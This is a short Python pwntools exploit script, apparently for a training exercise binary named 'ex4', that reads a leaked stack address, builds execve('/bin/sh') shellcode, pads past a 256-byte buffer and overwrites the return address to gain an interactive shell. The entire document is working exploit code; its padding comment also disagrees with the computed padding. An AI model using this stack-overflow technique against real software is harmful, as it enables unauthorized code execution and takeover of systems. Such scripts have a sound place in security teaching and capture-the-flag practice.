#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux')

target = process("./bin/ex4")

s = target.recvline()
address = int(s.split()[-1], 16)

print(f"Leaked address: {hex(address)}")

# craft your payload
payload = asm(f'''
    xor rax, rax
    mov rax, 59
    mov rbx, {u64(b'/bin/sh' + bytes(1))}
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')
# add to playload 246 bytes of padding

payload += b"A" * (256 - len(payload) + 8)
payload += address.to_bytes(8, 'little')

target.send(payload)
target.interactive()

